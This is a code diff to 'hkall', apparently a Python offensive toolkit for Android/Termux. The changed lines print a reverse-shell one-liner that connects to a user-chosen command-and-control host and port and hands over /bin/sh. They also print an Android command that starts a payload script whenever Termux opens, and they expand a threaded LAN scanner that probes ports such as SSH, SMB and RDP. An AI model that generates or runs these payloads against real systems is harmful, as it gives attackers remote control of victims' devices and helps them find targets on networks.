@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # hkall v0.2.0 - modular offensive toolkit for Android/Termux.
 # Authorized use only. You own the consequences.
-import socket, threading, os, sys, time, re, select, argparse, json, subprocess
+import socket, threading, os, sys, time, re, select, argparse, subprocess
 from datetime import datetime
 try:
     import termios, tty
@@ -255,48 +255,41 @@ while True:
     print(f"wrote {out}")
 
 def mod_py2exe():
-    section("SHELL PAYLOAD (metasploit-style raw)")
+    section("SHELL PAYLOAD (variants)")
     host = ask("c2 host: ").strip()
     port = ask("c2 port: ").strip() or "4444"
-    print("\n[android] am start -n com.termux/.app --ez run true --es cmd",
-          f'"cd $HOME && python payload.py&"')
-    print("[linux] run:  ", f'python3 -c \'import socket,subprocess,os;' +
-          f's=socket.socket();s.connect(("{host}",{port}));' +
-          f'[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')
+    print("\n[android/termux: run payload when termux opens]")
+    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd $HOME/hkall \\u0026\\u0026 python3 data/payload.py \\u0026"')
+    print("[linux one-liner]")
+    print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')
 
 # ---------------- net tools ----------------
-def _net_interface():
-    try:
-        import netifaces
-        return netifaces.gateways()["default"][netifaces.AF_INET][1]
-    except Exception:
-        return None
-
 def mod_discover():
-    section("LAN HOST DISCOVERER (ARP)")
+    section("LAN HOST DISCOVERER")
     cidr = ask("cidr [192.168.1.0/24]: ").strip() or "192.168.1.0/24"
-    net, mask = cidr.split("/")
-    mask = int(mask); base = [int(x) for x in net.split(".")]
-    ips = []
-    hosts = 2**(32 - mask)
-    for i in range(1, min(hosts, 2545)):
-        h = base[:]; 
-        v = i
-        for j in range(3, -1, -1):
-            h[j] = (v >> (8*(3-j))) & 0xFF if False else h[j]
-        # simple increment from network address
-        ips.append(net2ip(base, i))
-    found = []
+    try:
+        net, mask = cidr.split("/"); mask = int(mask)
+    except ValueError:
+        print("bad cidr"); return
+    base = [int(x) for x in net.split(".")]
+    if not (0 <= mask <= 32): print("bad mask"); return
+    ips = [net2ip(base, i) for i in range(1, min(2**(32-mask), 2545))]
+    PROBE_PORTS = (22, 80, 135, 139, 443, 445, 3389)
+    found = set()
+    lock = threading.Lock()
     def ping(ip):
-        s = socket.socket(); s.settimeout(0.4)
-        try:
-            s.connect((ip, 135)); found.append(ip)
-        except OSError: pass
-        finally: s.close()
+        for p in PROBE_PORTS:
+            s = socket.socket(); s.settimeout(0.4)
+            try:
+                s.connect((ip, p))
+                with lock: found.add(ip)
+                return
+            except OSError: pass
+            finally: s.close()
     ts = [threading.Thread(target=ping, args=(x,)) for x in ips]
     for t in ts: t.start()
     for t in ts: t.join()
-    print(f"up: {found or 'none'}")
+    print(f"up ({len(found)}): {sorted(found) or 'none'}")
 
 def net2ip(base, i):
     b = base[:]
